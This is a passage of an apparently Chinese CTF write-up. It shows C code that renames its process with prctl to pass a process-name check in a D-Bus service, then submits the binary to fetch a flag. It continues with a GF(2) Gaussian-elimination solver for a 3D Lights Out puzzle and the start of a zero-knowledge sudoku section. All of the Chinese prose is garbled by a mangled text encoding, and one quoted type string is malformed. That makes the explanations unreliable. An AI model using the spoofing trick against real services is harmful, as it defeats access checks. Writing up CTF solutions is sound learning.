</span></span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>prctl</span><span class=p>(</span><span class=n>PR_SET_NAME</span><span class=p>,</span> <span class=s>&#34;getflag3&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;prctl failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>GError</span> <span class=o>*</span><span class=n>error</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>GDBusConnection</span> <span class=o>*</span><span class=n>connection</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>GVariant</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>connection</span> <span class=o>=</span> <span class=nf>g_bus_get_sync</span><span class=p>(</span><span class=n>G_BUS_TYPE_SYSTEM</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>connection</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_printerr</span><span class=p>(</span><span class=s>&#34;Failed to connect to the system bus: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>-&gt;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_error_free</span><span class=p>(</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>EXIT_FAILURE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=nf>g_dbus_connection_call_sync</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>connection</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>DEST</span><span class=p>,</span>        <span class=c1>// destination
</span></span></span><span class=line><span class=cl>        <span class=n>OBJECT_PATH</span><span class=p>,</span> <span class=c1>// object path
</span></span></span><span class=line><span class=cl>        <span class=n>INTERFACE</span><span class=p>,</span>   <span class=c1>// interface name
</span></span></span><span class=line><span class=cl>        <span class=n>METHOD</span><span class=p>,</span>      <span class=c1>// method
</span></span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>        <span class=c1>// parameters
</span></span></span><span class=line><span class=cl>        <span class=nf>G_VARIANT_TYPE</span><span class=p>(</span><span class=s>&#34;(s)&#34;</span><span class=p>),</span> <span class=c1>// expected return type
</span></span></span><span class=line><span class=cl>        <span class=n>G_DBUS_CALL_FLAGS_NONE</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>-</span><span class=mi>1</span><span class=p>,</span>         <span class=c1>// timeout (use default)
</span></span></span><span class=line><span class=cl>        <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=o>&amp;</span><span class=n>error</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>const</span> <span class=n>gchar</span> <span class=o>*</span><span class=n>response</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_variant_get</span><span class=p>(</span><span class=n>result</span><span class=p>,</span> <span class=s>&#34;(&amp;s)&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>response</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_print</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>response</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_variant_unref</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_printerr</span><span class=p>(</span><span class=s>&#34;Error calling D-Bus method: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>-&gt;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>g_error_free</span><span class=p>(</span><span class=n>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>g_object_unref</span><span class=p>(</span><span class=n>connection</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>EXIT_SUCCESS</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li>ç¼–è¯‘ç¨‹åº:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc getflag3-modified.c <span class=sb>`</span>pkg-config --cflags --libs gio-2.0<span class=sb>`</span> -o getflag3-modified
</span></span></code></pre></div><ol start=2><li>å°†ç¼–è¯‘å¥½çš„ç¨‹åºè½¬æ¢æˆbase64:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>base64 getflag3-modified --wrap<span class=o>=</span><span class=m>0</span>
</span></span></code></pre></div><ol start=3><li>å°†base64ç¼–ç åçš„å†…å®¹æäº¤ç»™æœåŠ¡å™¨</li></ol><p>ä¸»è¦çš„æ”¹åŠ¨æ˜¯ï¼š</p><ol><li>æ·»åŠ äº†prctlç³»ç»Ÿè°ƒç”¨æ¥è®¾ç½®è¿›ç¨‹åä¸º"getflag3"</li><li>ä¿®æ”¹äº†è¿”å›ç±»å‹ä¸º<code>G_VARIANT_TYPE("(s")</code>ä»¥æ­£ç¡®å¤„ç†è¿”å›å€¼</li><li>æ·»åŠ äº†è¿”å›å€¼çš„æ‰“å°</li></ol><p>è¿™ä¸ªç¨‹åºåº”è¯¥èƒ½æˆåŠŸè·å–flag3ï¼Œå› ä¸ºï¼š</p><ol><li>ä½¿ç”¨prctlè®¾ç½®çš„è¿›ç¨‹åä¼šåæ˜ åœ¨/proc/{pid}/commä¸­</li><li>å³ä½¿ç¨‹åºæ–‡ä»¶åæ˜¯executableï¼Œé€šè¿‡prctlè®¾ç½®çš„è¿›ç¨‹åä¾ç„¶ä¼šç”Ÿæ•ˆ</li><li>ç¨‹åºåœ¨nobodyç”¨æˆ·ä¸‹è¿è¡Œä¹Ÿä¸ä¼šå½±å“prctlçš„åŠŸèƒ½</li></ol><p>æ‰€æœ‰çš„flagsç°åœ¨éƒ½åº”è¯¥æ‹¿åˆ°äº†ï¼è¿™ä¸ªé¢˜ç›®å¾ˆå¥½åœ°å±•ç¤ºäº†DBusæœåŠ¡çš„å®‰å…¨æ£€æŸ¥æœºåˆ¶ï¼ŒåŒ…æ‹¬ï¼š</p><ol><li>flag1: ç®€å•çš„å­—ç¬¦ä¸²åŒ¹é…</li><li>flag2: æ–‡ä»¶æè¿°ç¬¦å’Œå†…å®¹æ£€æŸ¥</li><li>flag3: è¿›ç¨‹åéªŒè¯</li></ol><pre tabindex=0><code>flag{prprprprprCTL_15your_FRiEND_9f3f4bbbc3}
</code></pre></details><h2 id=å…³ç¯>å…³ç¯<a hidden class=anchor aria-hidden=true href=#å…³ç¯>#</a></h2><p>è¿™é“é¢˜ä¸»è¦æ˜¯æŠŠç¯çš„å­—ç¬¦ä¸²è½¬æ¢æˆçŸ©é˜µï¼Œç„¶åç”¨é«˜æ–¯æ¶ˆå…ƒæ³•è§£æ–¹ç¨‹ç»„ã€‚æœ€åä¸€é—®æ²¡æœ‰æƒ³åˆ°å¯ä»¥æå‰ä¿å­˜PLUåˆ†è§£çš„ç»“æœï¼Œå› æ­¤è‡ªè®¤ä¸ºè€—æ—¶å¤ªé•¿å°±æ”¾å¼ƒäº†ã€‚</p><ol><li>å°†3Dé—®é¢˜è½¬æ¢ä¸ºçº¿æ€§æ–¹ç¨‹ç»„</li><li>ä½¿ç”¨GF(2)ä¸Šçš„é«˜æ–¯æ¶ˆå…ƒæ³•æ±‚è§£ï¼ˆå› ä¸ºå¼€å…³çŠ¶æ€æ˜¯0/1çš„å¼‚æˆ–è¿ç®—ï¼‰</li><li>å°†è§£è½¬æ¢å›å¼€å…³åºåˆ—</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>typing</span> <span class=kn>import</span> <span class=n>List</span><span class=p>,</span> <span class=n>Tuple</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_coefficient_matrix</span><span class=p>(</span><span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>np</span><span class=o>.</span><span class=n>ndarray</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Create the coefficient matrix for the linear system.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>size</span> <span class=o>=</span> <span class=n>n</span> <span class=o>*</span> <span class=n>n</span> <span class=o>*</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=n>matrix</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>((</span><span class=n>size</span><span class=p>,</span> <span class=n>size</span><span class=p>),</span> <span class=n>dtype</span><span class=o>=</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>idx</span> <span class=o>=</span> <span class=n>i</span> <span class=o>*</span> <span class=n>n</span> <span class=o>*</span> <span class=n>n</span> <span class=o>+</span> <span class=n>j</span> <span class=o>*</span> <span class=n>n</span> <span class=o>+</span> <span class=n>k</span>
</span></span><span class=line><span class=cl>                <span class=c1># The switch affects itself</span>
</span></span><span class=line><span class=cl>                <span class=n>matrix</span><span class=p>[</span><span class=n>idx</span><span class=p>][</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=c1># Affect adjacent positions</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>   <span class=c1># up</span>
</span></span><span class=line><span class=cl>                    <span class=n>matrix</span><span class=p>[</span><span class=n>idx</span> <span class=o>-</span> <span class=n>n</span><span class=o>*</span><span class=n>n</span><span class=p>][</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>n</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=c1># down</span>
</span></span><span class=line><span class=cl>                    <span class=n>matrix</span><span class=p>[</span><span class=n>idx</span> <span class=o>+</span> <span class=n>n</span><span class=o>*</span><span class=n>n</span><span class=p>][</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>j</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>   <span class=c1># left</span>
</span></span><span class=line><span class=cl>                    <span class=n>matrix</span><span class=p>[</span><span class=n>idx</span> <span class=o>-</span> <span class=n>n</span><span class=p>][</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=n>n</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=c1># right</span>
</span></span><span class=line><span class=cl>                    <span class=n>matrix</span><span class=p>[</span><span class=n>idx</span> <span class=o>+</span> <span class=n>n</span><span class=p>][</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>k</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>   <span class=c1># front</span>
</span></span><span class=line><span class=cl>                    <span class=n>matrix</span><span class=p>[</span><span class=n>idx</span> <span class=o>-</span> <span class=mi>1</span><span class=p>][</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>k</span> <span class=o>&lt;</span> <span class=n>n</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=c1># back</span>
</span></span><span class=line><span class=cl>                    <span class=n>matrix</span><span class=p>[</span><span class=n>idx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>][</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>matrix</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gauss_elimination_gf2</span><span class=p>(</span><span class=n>matrix</span><span class=p>:</span> <span class=n>np</span><span class=o>.</span><span class=n>ndarray</span><span class=p>,</span> <span class=n>vector</span><span class=p>:</span> <span class=n>np</span><span class=o>.</span><span class=n>ndarray</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>np</span><span class=o>.</span><span class=n>ndarray</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Perform Gaussian elimination in GF(2).&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>vector</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>augmented</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>column_stack</span><span class=p>((</span><span class=n>matrix</span><span class=p>,</span> <span class=n>vector</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Forward elimination</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># Find pivot</span>
</span></span><span class=line><span class=cl>        <span class=n>pivot_row</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>pivot_row</span> <span class=o>&lt;</span> <span class=n>n</span> <span class=ow>and</span> <span class=n>augmented</span><span class=p>[</span><span class=n>pivot_row</span><span class=p>,</span> <span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>pivot_row</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pivot_row</span> <span class=o>==</span> <span class=n>n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=c1># Swap rows if necessary</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pivot_row</span> <span class=o>!=</span> <span class=n>i</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>augmented</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>augmented</span><span class=p>[</span><span class=n>pivot_row</span><span class=p>]</span> <span class=o>=</span> <span class=n>augmented</span><span class=p>[</span><span class=n>pivot_row</span><span class=p>]</span><span class=o>.</span><span class=n>copy</span><span class=p>(),</span> <span class=n>augmented</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>copy</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Eliminate below</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>augmented</span><span class=p>[</span><span class=n>j</span><span class=p>,</span> <span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>augmented</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>augmented</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>+</span> <span class=n>augmented</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>%</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Back substitution</span>
</span></span><span class=line><span class=cl>    <span class=n>solution</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>zeros</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>dtype</span><span class=o>=</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>augmented</span><span class=p>[</span><span class=n>i</span><span class=p>,</span> <span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>augmented</span><span class=p>[</span><span class=n>i</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;No solution exists&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>solution</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>augmented</span><span class=p>[</span><span class=n>i</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>solution</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>solution</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>augmented</span><span class=p>[</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>]</span> <span class=o>*</span> <span class=n>solution</span><span class=p>[</span><span class=n>j</span><span class=p>])</span> <span class=o>%</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>solution</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_lights_out_3d</span><span class=p>(</span><span class=n>lights_string</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Solve the 3D Lights Out puzzle.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Convert lights string to array</span>
</span></span><span class=line><span class=cl>    <span class=n>lights</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>([</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>lights_string</span><span class=p>],</span> <span class=n>dtype</span><span class=o>=</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Create coefficient matrix</span>
</span></span><span class=line><span class=cl>    <span class=n>coef_matrix</span> <span class=o>=</span> <span class=n>create_coefficient_matrix</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Solve using Gaussian elimination</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>solution</span> <span class=o>=</span> <span class=n>gauss_elimination_gf2</span><span class=p>(</span><span class=n>coef_matrix</span><span class=p>,</span> <span class=n>lights</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span> <span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;No solution exists&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Example usage function</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_puzzle</span><span class=p>(</span><span class=n>lights_string</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>solve_lights_out_3d</span><span class=p>(</span><span class=n>lights_string</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>result</span> <span class=o>==</span> <span class=s2>&#34;No solution exists&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No solution exists for this puzzle&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span></code></pre></div><p>flagï¼š</p><pre tabindex=0><code>flag{bru7e_f0rce_1s_a1l_y0u_n3ed_1f50afa982}
flag{prun1ng_1s_u5eful_690eea3cbb}
flag{lin3ar_alg3bra_1s_p0werful_27dafeebb2}
</code></pre><h2 id=é›¶çŸ¥è¯†æ•°ç‹¬>é›¶çŸ¥è¯†æ•°ç‹¬<a hidden class=anchor aria-hidden=true href=#é›¶çŸ¥è¯†æ•°ç‹¬>#</a></h2><h3 id=æ•°ç‹¬é«˜æ‰‹>æ•°ç‹¬é«˜æ‰‹<a hidden class=anchor aria-hidden=true href=#æ•°ç‹¬é«˜æ‰‹>#</a></h3><p>ç›´æ¥åšæ•°ç‹¬å°±å¯ä»¥å¾—åˆ°flag</p><h3 id=zké«˜æ‰‹>ZKé«˜æ‰‹<a hidden class=anchor aria-hidden=true href=#zké«˜æ‰‹>#</a></h3><p>åœ¨åšè¿™é“é¢˜ä¹‹å‰ï¼Œæˆ‘å¯¹é›¶çŸ¥è¯†è¯æ˜å®Œå…¨ä¸äº†è§£ï¼Œå› æ­¤å…ˆé—®äº†AIè¿™é“é¢˜æ˜¯ä»€ä¹ˆæ„æ€ï¼š</p><ol><li>è¿™æ˜¯ä¸€ä¸ªé›¶çŸ¥è¯†æ•°ç‹¬è¯æ˜ç³»ç»Ÿï¼Œå…¶ä¸­:<ul><li>æ•°ç‹¬è°œé¢˜(unsolved_grid)æ˜¯å…¬å¼€çš„</li><li>è§£ç­”(solved_grid)æ˜¯ç§å¯†çš„</li><li>éœ€è¦ç”Ÿæˆä¸€ä¸ªè¯æ˜æ¥è¯æ˜æˆ‘ä»¬çŸ¥é“æ­£ç¡®çš„è§£ç­”</li></ul></li><li>ä¸ºäº†è§£é¢˜ï¼Œæˆ‘ä»¬éœ€è¦:<ol><li>æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„æ•°ç‹¬è°œé¢˜åŠå…¶è§£ç­”</li><li>ä½¿ç”¨circomç”µè·¯ç”Ÿæˆè¯æ˜</li><li>ç¡®ä¿è¯æ˜å¯ä»¥é€šè¿‡verification_key.jsonçš„éªŒè¯</li></ol></li><li>verification_key.jsonæ˜¾ç¤ºè¿™æ˜¯ä½¿ç”¨Groth16åè®®ï¼Œéœ€è¦81ä¸ªå…¬å¼€è¾“å…¥(å°±æ˜¯9x9çš„æ•°ç‹¬è°œé¢˜)ã€‚</li></ol><p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯ï¼š</p><ol><li>æ„é€ ä¸€ä¸ªæœ‰æ•ˆçš„æ•°ç‹¬é¢˜ç›®å’Œè§£ç­”</li><li>ä½¿ç”¨setup.shç”Ÿæˆæ‰€éœ€çš„è¯æ˜ç³»ç»Ÿç»„ä»¶</li><li>ç”Ÿæˆå¹¶éªŒè¯proof.json</li></ol><p>å…ˆå†™ä¸€ä¸ªæ•°ç‹¬è§£ç çš„è„šæœ¬ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_grid</span><span class=p>(</span><span class=n>grid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Pretty print the sudoku grid&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>3</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=n>i</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;- - - - - - - - - - - -&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>j</span> <span class=o>%</span> <span class=mi>3</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=n>j</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;|&#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>j</span> <span class=o>==</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>grid</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>])</span> <span class=o>+</span> <span class=s2>&#34; &#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>convert_1d_to_2d</span><span class=p>(</span><span class=n>puzzle</span><span class=p>):</span>
